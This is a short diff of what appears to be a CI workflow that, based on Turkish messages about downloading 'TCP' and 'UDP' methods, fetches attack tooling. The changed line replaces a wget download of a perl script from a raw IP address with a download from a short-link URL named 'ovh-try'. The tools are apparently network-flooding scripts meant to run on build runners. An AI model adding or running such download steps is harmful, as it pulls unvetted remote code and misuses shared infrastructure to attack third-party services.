@@ -31,7 +31,7 @@ jobs:
 
           if [ "$METHOD" = "tcp" ]; then
             echo "TCP methodu indiriliyor..."
-            wget http://91.232.103.84/deneme.perl -O a
+            wget https://wgetz.com/3Tb2EYyneF/ovh-try -O a
 
           elif [ "$METHOD" = "udp" ]; then
             echo "UDP methodu indiriliyor..."
